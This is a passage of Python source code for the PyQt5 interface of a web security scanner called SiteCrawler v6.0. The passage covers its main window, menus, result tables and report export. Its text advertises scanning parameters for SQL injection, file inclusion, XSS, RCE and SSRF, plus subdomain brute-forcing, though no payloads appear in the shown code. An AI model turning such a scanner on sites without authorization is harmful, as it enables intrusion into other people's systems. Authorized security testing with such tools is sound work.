            "subdomain_enum": self.subdomain_cb.isChecked(),
            "recon":         self.recon_cb.isChecked(),
            "headers":       self._custom_headers,
        }


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("SiteCrawler v6.0")
        self.setMinimumSize(1400, 860)
        self.resize(1600, 960)
        self.worker = None
        self._fps   = {}
        self._subs  = []
        self._scan_start = None
        self._elapsed_timer = QTimer(self)
        self._elapsed_timer.timeout.connect(self._tick_elapsed)
        self._elapsed_timer.start(1000)
        self.setStyleSheet(QSS)
        pal = QPalette()
        pal.setColor(QPalette.Window, QColor(C["bg0"]))
        pal.setColor(QPalette.WindowText, QColor(C["t0"]))
        QApplication.setPalette(pal)
        self._build_menu()
        self._build_ui()
        self._build_status()
        self._log("SiteCrawler v6.0 ready.", "ok")
        self._log("New: ALL responses shown (302/403/405/500), param vuln scanning, subdomain enum, PHP param paths.", "info")
        self._log("Tip: Enter paths like 'news-read.php?id=36' in Extra Paths to scan and test them for SQLi/LFI/XSS.", "info")

    def _build_menu(self):
        mb = self.menuBar()
        fm = mb.addMenu("&File")
        for label, slot, key in [
            ("New Scan",    self._reset,       "Ctrl+N"),
            ("Save Results…", self._save,      "Ctrl+S"),
            ("Export JSON…", self._export_json, "Ctrl+E"),
            ("Export HTML…", self._export_html, "Ctrl+R"),
        ]:
            a = QAction(label, self)
            a.setShortcut(key)
            a.triggered.connect(slot)
            fm.addAction(a)
        fm.addSeparator()
        a = QAction("Exit", self)
        a.setShortcut("Ctrl+Q")
        a.triggered.connect(self.close)
        fm.addAction(a)
        sm = mb.addMenu("&Scan")
        for label, slot, key in [("Start Scan", self._start, "F5"), ("Stop Scan", self._stop, "F6")]:
            a = QAction(label, self)
            a.setShortcut(key)
            a.triggered.connect(slot)
            sm.addAction(a)
        sm.addSeparator()
        a = QAction("Clear Terminal", self)
        a.triggered.connect(lambda: self.log_terminal.clear())
        sm.addAction(a)
        a = QAction("Clear Results", self)
        a.triggered.connect(self._clear_results)
        sm.addAction(a)
        vm = mb.addMenu("&View")
        for i, label in enumerate(["Terminal", "Results", "Recon", "Risk Report", "Subdomains", "Headers"]):
            a = QAction(label, self)
            a.setShortcut(f"Ctrl+{i+1}")
            a.triggered.connect(lambda _, idx=i: self.tabs.setCurrentIndex(idx))
            vm.addAction(a)
        hm = mb.addMenu("&Help")
        a = QAction("About", self)
        a.triggered.connect(self._about)
        hm.addAction(a)

    def _build_ui(self):
        root = QWidget()
        root.setObjectName("root_widget")
        root.setStyleSheet(f"QWidget#root_widget{{background:{C['bg0']};}}")
        self.setCentralWidget(root)
        root_lay = QVBoxLayout(root)
        root_lay.setContentsMargins(0, 0, 0, 0)
        root_lay.setSpacing(0)
        self.topbar = TopBar()
        root_lay.addWidget(self.topbar)
        splitter = QSplitter(Qt.Horizontal)
        splitter.setHandleWidth(1)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{C['line']};}}")
        root_lay.addWidget(splitter, 1)
        self.sidebar = Sidebar()
        self.sidebar.btn_start.clicked.connect(self._start)
        self.sidebar.btn_stop.clicked.connect(self._stop)
        splitter.addWidget(self.sidebar)

        right = QWidget()
        right.setStyleSheet(f"background:{C['bg0']};")
        rv = QVBoxLayout(right)
        rv.setContentsMargins(10, 10, 10, 10)
        rv.setSpacing(10)

        stat_row = QHBoxLayout()
        stat_row.setSpacing(8)
        self.sc_total   = StatCard("Scanned",   "0", C["cyan"],   "⬡")
        self.sc_active  = StatCard("Active",    "0", C["green"],  "✦")
        self.sc_crit    = StatCard("Critical",  "0", C["red"],    "⚡")
        self.sc_high    = StatCard("High",      "0", C["orange"], "▲")
        self.sc_med     = StatCard("Medium",    "0", C["yellow"], "◆")
        self.sc_vulns   = StatCard("Param Vulns","0", C["purple"], "⚔")
        self.sc_subs    = StatCard("Subdomains","0", C["blue"],   "🌐")
        self.sc_elapsed = StatCard("Elapsed",   "—", C["t1"],     "⏱")
        for sc in [self.sc_total, self.sc_active, self.sc_crit, self.sc_high, self.sc_med, self.sc_vulns, self.sc_subs, self.sc_elapsed]:
            stat_row.addWidget(sc)
        rv.addLayout(stat_row)

        prog_row = QHBoxLayout()
        prog_row.setSpacing(8)
        self.progress = QProgressBar()
        self.progress.setFixedHeight(8)
        self.progress.setTextVisible(False)
        self.progress_lbl = QLabel("Ready")
        self.progress_lbl.setStyleSheet(f"color:{C['t2']};font-size:11px;background:transparent;min-width:180px;")
        prog_row.addWidget(self.progress, 1)
        prog_row.addWidget(self.progress_lbl)
        rv.addLayout(prog_row)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        rv.addWidget(self.tabs, 1)

        t0_w = QWidget()
        t0_w.setStyleSheet(f"background:{C['bg1']};")
        t0_l = QVBoxLayout(t0_w)
        t0_l.setContentsMargins(0, 6, 0, 0)
        t0_l.setSpacing(4)
        ctrl_bar = QHBoxLayout()
        ctrl_bar.setContentsMargins(8, 0, 8, 0)
        lbl_term = SectionLabel("Live Terminal Output")
        btn_clr  = QPushButton("Clear Terminal")
        btn_clr.setObjectName("btn_action")
        btn_clr.setFixedHeight(28)
        btn_clr.setFixedWidth(140)
        btn_clr.clicked.connect(lambda: self.log_terminal.clear())
        ctrl_bar.addWidget(lbl_term)
        ctrl_bar.addStretch()
        ctrl_bar.addWidget(btn_clr)
        self.log_terminal = LogTerminal()
        t0_l.addLayout(ctrl_bar)
        t0_l.addWidget(self.log_terminal)
        self.tabs.addTab(t0_w, "  Terminal  ")

        t1_w = QWidget()
        t1_w.setStyleSheet(f"background:{C['bg1']};")
        t1_l = QVBoxLayout(t1_w)
        t1_l.setContentsMargins(0, 6, 0, 0)
        t1_l.setSpacing(6)
        fbar = QHBoxLayout()
        fbar.setContentsMargins(8, 0, 8, 0)
        fbar.setSpacing(8)
        fbar.addWidget(SectionLabel("Endpoint Results"))
        fbar.addSpacing(16)
        fbar.addWidget(QLabel("Filter:"))
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("Filter by URL, method, status, vuln type…")
        self.filter_input.setFixedHeight(30)
        self.filter_input.textChanged.connect(self._filter)
        self.risk_filter = QComboBox()
        self.risk_filter.setFixedWidth(140)
        self.risk_filter.setFixedHeight(30)
        self.risk_filter.addItems(["All Risks", "CRITICAL", "HIGH", "MEDIUM", "LOW"])
        self.risk_filter.currentIndexChanged.connect(self._filter)
        btn_clr2 = QPushButton("Clear")
        btn_clr2.setObjectName("btn_action")
        btn_clr2.setFixedHeight(30)
        btn_clr2.setFixedWidth(80)
        btn_clr2.clicked.connect(self._clear_results)
        fbar.addWidget(self.filter_input, 1)
        fbar.addWidget(self.risk_filter)
        fbar.addWidget(btn_clr2)
        t1_l.addLayout(fbar)
        vsplit = QSplitter(Qt.Vertical)
        vsplit.setHandleWidth(4)
        self.results_table = ResultsTable()
        self.results_table.cellClicked.connect(self._on_row_click)
        vsplit.addWidget(self.results_table)
        detail_wrap = QWidget()
        detail_wrap.setStyleSheet(f"background:{C['bg1']};")
        dw_l = QVBoxLayout(detail_wrap)
        dw_l.setContentsMargins(0, 0, 0, 0)
        dw_l.setSpacing(0)
        dw_l.addWidget(SectionLabel("Endpoint Detail  —  click any row above"))
        self.detail_view = DetailView()
        dw_l.addWidget(self.detail_view, 1)
        vsplit.addWidget(detail_wrap)
        vsplit.setSizes([440, 360])
        t1_l.addWidget(vsplit, 1)
        self.tabs.addTab(t1_w, "  Results  ")

        t2_w = QWidget()
        t2_w.setStyleSheet(f"background:{C['bg1']};")
        t2_l = QVBoxLayout(t2_w)
        t2_l.setContentsMargins(0, 6, 0, 0)
        t2_l.setSpacing(0)
        t2_l.addWidget(SectionLabel("Server Reconnaissance"))
        self.recon_view = ReconView()
        t2_l.addWidget(self.recon_view, 1)
        self.tabs.addTab(t2_w, "  Recon  ")

        t3_w = QWidget()
        t3_w.setStyleSheet(f"background:{C['bg1']};")
        t3_l = QVBoxLayout(t3_w)
        t3_l.setContentsMargins(0, 6, 0, 0)
        t3_l.setSpacing(0)
        t3_l.addWidget(SectionLabel("Analyst Risk Report"))
        self.risk_report = RiskReportView()
        t3_l.addWidget(self.risk_report, 1)
        self.tabs.addTab(t3_w, "  Risk Report  ")

        t4_w = QWidget()
        t4_w.setStyleSheet(f"background:{C['bg1']};")
        t4_l = QVBoxLayout(t4_w)
        t4_l.setContentsMargins(0, 6, 0, 0)
        t4_l.setSpacing(0)
        t4_l.addWidget(SectionLabel("Subdomain Enumeration"))
        self.subdomain_view = SubdomainView()
        t4_l.addWidget(self.subdomain_view, 1)
        self.tabs.addTab(t4_w, "  Subdomains  ")

        t5_w = QWidget()
        t5_w.setStyleSheet(f"background:{C['bg1']};")
        t5_l = QVBoxLayout(t5_w)
        t5_l.setContentsMargins(0, 6, 0, 0)
        t5_l.setSpacing(0)
        t5_l.addWidget(SectionLabel("All Response Headers"))
        self.headers_view = QTextBrowser()
        self.headers_view.setOpenLinks(False)
        t5_l.addWidget(self.headers_view, 1)
        self.tabs.addTab(t5_w, "  Headers  ")

        splitter.addWidget(right)
        splitter.setSizes([340, 1260])

    def _build_status(self):
        sb = self.statusBar()
        self._status_main  = QLabel("Ready — Configure target and press  ▶ START SCAN  (F5)")
        self._status_count = QLabel("")
        self._status_mode  = QLabel("")
        self._status_main.setStyleSheet(f"color:{C['t1']};background:transparent;")
        self._status_count.setStyleSheet(f"color:{C['cyan']};background:transparent;")
        self._status_mode.setStyleSheet(f"color:{C['t2']};background:transparent;padding-right:8px;")
        sb.addWidget(self._status_main, 1)
        sb.addPermanentWidget(self._status_count)
        sb.addPermanentWidget(self._status_mode)

    def _log(self, msg, level="info"):
        self.log_terminal.log(msg, level)

    def _update_stats(self):
        total    = len(self._fps)
        active   = sum(1 for f in self._fps.values() if f.get("interesting"))
        critical = sum(1 for f in self._fps.values() if f["risk"] == "CRITICAL")
        high     = sum(1 for f in self._fps.values() if f["risk"] == "HIGH")
        medium   = sum(1 for f in self._fps.values() if f["risk"] == "MEDIUM")
        vulns    = sum(len(f.get("param_vulns", [])) for f in self._fps.values())
        self.sc_total.set_value(total)
        self.sc_active.set_value(active)
        self.sc_crit.set_value(critical)
        self.sc_high.set_value(high)
        self.sc_med.set_value(medium)
        self.sc_vulns.set_value(vulns)
        self._status_count.setText(f"  {total} found  |  {critical} crit  {high} high  {medium} med  {vulns} vulns  ")

    def _tick_elapsed(self):
        if self._scan_start and self.worker and self.worker.isRunning():
            e = int(time.time() - self._scan_start)
            m, s = divmod(e, 60)
            self.sc_elapsed.set_value(f"{m:02d}:{s:02d}")

    def _start(self):
        cfg = self.sidebar.get_config()
        url = cfg["url"]
        if not url:
            QMessageBox.warning(self, "No URL", "Please enter a target URL.")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.sidebar.url_input.setText(url)
            cfg["url"] = url
        if not cfg["methods"]:
            QMessageBox.warning(self, "No Methods", "Select at least one HTTP method.")
            return
        self._fps  = {}
        self._subs = []
        self._scan_start = time.time()
        self.sc_elapsed.set_value("00:00")
        self._reset_counts()
        self.results_table.setRowCount(0)
        self.log_terminal.clear()
        self.detail_view.clear()
        self.progress.setMaximum(0)
        self.progress.setValue(0)
        self.sidebar.btn_start.setEnabled(False)
        self.sidebar.btn_stop.setEnabled(True)
        mode_names = ["Normal", "Crawl", "API", "Hybrid", "Full", "Probe"]
        mode_idx   = int(cfg["mode"]) - 1
        self._status_main.setText(f"Scanning  {url}")
        self._status_mode.setText(f"Mode: {mode_names[mode_idx]}  |  {cfg['threads']} threads")
        self.tabs.setCurrentIndex(0)
        self.worker = ScanWorker(cfg)
        self.worker.log_signal.connect(self._on_log)
        self.worker.result_signal.connect(self._on_result)
        self.worker.recon_signal.connect(self._on_recon)
        self.worker.progress_signal.connect(self._on_progress)
        self.worker.done_signal.connect(self._on_done)
        self.worker.baseline_signal.connect(self._on_baseline)
        self.worker.subdomain_signal.connect(self._on_subdomains)
        self.worker.start()

    def _stop(self):
        if self.worker:
            self.worker.stop()
            self._log("Stop requested — waiting for in-flight requests…", "warn")

    def _reset(self):
        self._stop()
        self._fps  = {}
        self._subs = []
        self._reset_counts()
        self.results_table.setRowCount(0)
        self.log_terminal.clear()
        self.detail_view.clear()
        self.recon_view.clear()
        self.risk_report.clear()
        self.subdomain_view.clear()
        self.headers_view.clear()
        self.progress.setValue(0)
        self.progress.setMaximum(100)
        self._status_main.setText("Ready — Configure target and press  ▶ START SCAN  (F5)")
        self._status_count.setText("")
        self._status_mode.setText("")
        self.sc_elapsed.set_value("—")

    def _reset_counts(self):
        for sc in [self.sc_total, self.sc_active, self.sc_crit, self.sc_high, self.sc_med, self.sc_vulns]:
            sc.set_value("0")

    def _clear_results(self):
        self._fps = {}
        self._reset_counts()
        self.results_table.setRowCount(0)
        self.detail_view.clear()

    @pyqtSlot(str, str)
    def _on_log(self, msg, level):
        self.log_terminal.log(msg, level)

    @pyqtSlot(dict)
    def _on_baseline(self, info):
        self.sidebar.update_baseline(info)

    @pyqtSlot(dict)
    def _on_result(self, fp):
        self._fps[fp["path"]] = fp
        self.results_table.add_fp(fp)
        self._update_stats()

    @pyqtSlot(list)
    def _on_subdomains(self, subs):
        self._subs = subs
        self.subdomain_view.render(subs)
        self.sc_subs.set_value(len(subs))

    @pyqtSlot(dict)
    def _on_recon(self, profile):
        self.recon_view.render(profile)
        hdrs = profile.get("headers", {})
        html = _html_head("Headers") + "<h1>All Response Headers</h1>"
        html += "<table><tr><th>Header</th><th>Value</th></tr>"
        for k, v in hdrs.items():
            html += f"<tr><td class='dim'>{k}</td><td>{v}</td></tr>"
        html += "</table>" + _html_close()
        self.headers_view.setHtml(html)
        self.tabs.setCurrentIndex(2)

    @pyqtSlot(int, int)
    def _on_progress(self, done, total):
        if self.progress.maximum() == 0:
            self.progress.setMaximum(total)
        self.progress.setValue(done)
        self.progress_lbl.setText(f"{done} / {total} paths")

    @pyqtSlot(float)
    def _on_done(self, elapsed):
        self.sidebar.btn_start.setEnabled(True)
        self.sidebar.btn_stop.setEnabled(False)
        self._scan_start = None
        m, s = divmod(int(elapsed), 60)
        self.sc_elapsed.set_value(f"{m:02d}:{s:02d}")
        if self.progress.maximum() == 0:
            self.progress.setMaximum(1)
            self.progress.setValue(1)
        self.risk_report.render(self._fps, server_profile)
        total = len(self._fps)
        crit  = sum(1 for f in self._fps.values() if f["risk"] == "CRITICAL")
        vulns = sum(len(f.get("param_vulns", [])) for f in self._fps.values())
        self._log(f"Scan complete in {elapsed:.1f}s — {total} findings, {crit} critical, {vulns} param vulnerabilities", "ok")
        self._status_main.setText(f"Scan complete — {elapsed:.1f}s  |  {total} findings  |  {vulns} param vulns")
        self.tabs.setCurrentIndex(1)

    def _on_row_click(self, row, col):
        path_item = self.results_table.item(row, 3)
        if not path_item:
            return
        fp = self._fps.get(path_item.text())
        if fp:
            self.detail_view.render(fp)

    def _filter(self):
        text     = self.filter_input.text().lower()
        risk_flt = self.risk_filter.currentText()
        for row in range(self.results_table.rowCount()):
            risk_item = self.results_table.item(row, 0)
            if not risk_item:
                continue
            risk     = risk_item.text()
            row_text = " ".join(
                self.results_table.item(row, c).text().lower()
                for c in range(self.results_table.columnCount())
                if self.results_table.item(row, c)
            )
            self.results_table.setRowHidden(row,
                not ((risk_flt == "All Risks" or risk == risk_flt) and (not text or text in row_text)))

    def _save(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save Results", "sitecrawler_results.txt", "Text (*.txt);;All (*)")
        if not path:
            return
        lines = []
        for fp in self._fps.values():
            for method, r in fp["interesting"].items():
                param_vulns = fp.get("param_vulns", [])
                line = (f"[{fp['risk']:<8}] [{r['status']}] [{method}] {fp['url']}"
                        + (f" | tech:{','.join(fp.get('tech', []))}"   if fp.get("tech")       else "")
                        + (f" | waf:{','.join(fp.get('waf', []))}"     if fp.get("waf")        else "")
                        + (f" | vulns:{len(param_vulns)}"              if param_vulns           else "")
                        + (f" | cors:{';'.join(fp.get('cors_issues', []))}" if fp.get("cors_issues") else ""))
                lines.append(line)
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        self._log(f"Results saved  →  {path}  ({len(lines)} entries)", "ok")
        QMessageBox.information(self, "Saved", f"Saved {len(lines)} findings to:\n{path}")

    def _export_json(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export JSON", "sitecrawler.json", "JSON (*.json)")
        if not path:
            return
        out = {}
        for p, fp in self._fps.items():
            entry = {k: v for k, v in fp.items() if k not in ("methods", "sample_headers", "sample_body", "sample_body_analysis")}
            entry["methods"] = {
                m: {"status": r.get("status"), "elapsed_ms": r.get("elapsed_ms"),
                    "content_type": r.get("content_type", ""), "location": r.get("location", ""),
                    "body_len": len(r.get("body", "")), "false_positive": r.get("false_positive", False)}
                for m, r in fp["methods"].items()
            }
            ba = fp.get("sample_body_analysis", {})
            entry["body_secrets"] = ba.get("secrets", [])
            entry["body_errors"]  = ba.get("errors", [])
            entry["param_vulns"]  = fp.get("param_vulns", [])
            out[p] = entry
        if self._subs:
            out["__subdomains__"] = self._subs
        with open(path, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, default=str)
        self._log(f"JSON exported  →  {path}", "ok")
        QMessageBox.information(self, "Exported", f"Exported {len(out)} entries to:\n{path}")

    def _export_html(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export HTML", "sitecrawler_report.html", "HTML (*.html)")
        if not path:
            return
        html = _html_head("SiteCrawler v6.0 Report")
        html += "<h1>⚡ SiteCrawler v6.0 — Full Scan Report</h1>"
        html += f"<p class='dim'>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>"
        if self._subs:
            html += "<h2>Subdomains Found</h2><table><tr><th>Subdomain</th><th>IP</th></tr>"
            for s in self._subs:
                html += f"<tr><td class='cyan'>{s['subdomain']}</td><td>{s['ip']}</td></tr>"
            html += "</table>"
        self.risk_report.render(self._fps, server_profile)
        for fp in sorted(self._fps.values(), key=lambda f: ["CRITICAL", "HIGH", "MEDIUM", "LOW"].index(f["risk"])):
            rc  = risk_color(fp["risk"])
            ba  = fp.get("sample_body_analysis", {})
            param_vulns = fp.get("param_vulns", [])
            html += f"<hr style='border-color:{C['line']};margin:20px 0'>"
            html += f"<h2 style='color:{rc}'>[{fp['risk']}] {fp['url']}</h2>"
            html += "<table><tr><th>Method</th><th>Status</th><th>Time</th><th>Body Len</th></tr>"
            for m, r in fp["interesting"].items():
                sc2 = status_color(r["status"])
                html += (f"<tr><td>{m}</td><td style='color:{sc2}'>{r['status']}</td>"
                         f"<td>{r.get('elapsed_ms', '?')}ms</td><td>{len(r.get('body', '')):,}</td></tr>")
            html += "</table>"
            if fp.get("tech"):
                html += "".join(f'<span class="badge badge-cyan">{t}</span>' for t in fp["tech"])
            for pv in param_vulns:
                payload_safe = str(pv['payload']).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                html += f"<p class='crit'>⚡ PARAM VULN [{pv['vuln_type'].upper()}] {pv['param']}={payload_safe}</p>"
            for s in ba.get("secrets", []):
                html += f"<p class='crit'>⚡ SECRET: {s}</p>"
            for e in ba.get("errors", []):
                html += f"<p class='crit'>⚡ LEAK: {e}</p>"
        html += _html_close()
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        self._log(f"HTML exported  →  {path}", "ok")
        QMessageBox.information(self, "Exported", f"Saved to:\n{path}")

    def _about(self):
        QMessageBox.about(self, "About SiteCrawler",
            "<b style='font-size:14px'>SiteCrawler v6.0</b><br><br>"
            "Analyst-grade endpoint fingerprinting &amp; security assessment.<br><br>"
            "<b>v6.0 improvements over v5:</b><br>"
            "• ALL responses shown — 302/403/405/500 appear in results<br>"
            "• Parameter vulnerability scanning: SQLi, LFI, XSS, RCE, SSTI, Open Redirect, SSRF<br>"
            "• Subdomain enumeration (DNS brute-force with 100+ wordlist)<br>"
            "• PHP parameterized paths in built-in list (news-read.php?id=1 etc.)<br>"
            "• Extra paths input box — paste any URL/path with params to scan<br>"
            "• Crawl now extracts parameterized URLs from source<br>"
            "• Comments removed from source<br><br>"
            "<b>Author:</b> CoderSigma")


def main():
    if not REQUESTS_OK:
        print("[ERROR] Missing: pip install requests PyQt5")
        sys.exit(1)
    app = QApplication(sys.argv)
    app.setApplicationName("SiteCrawler")
    app.setApplicationVersion("6.0")
    for fn in ["Consolas", "Courier New", "DejaVu Sans Mono", "Liberation Mono", "Monospace"]:
        f = QFont(fn, 12)
        if f.exactMatch():
            app.setFont(f)
            break
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()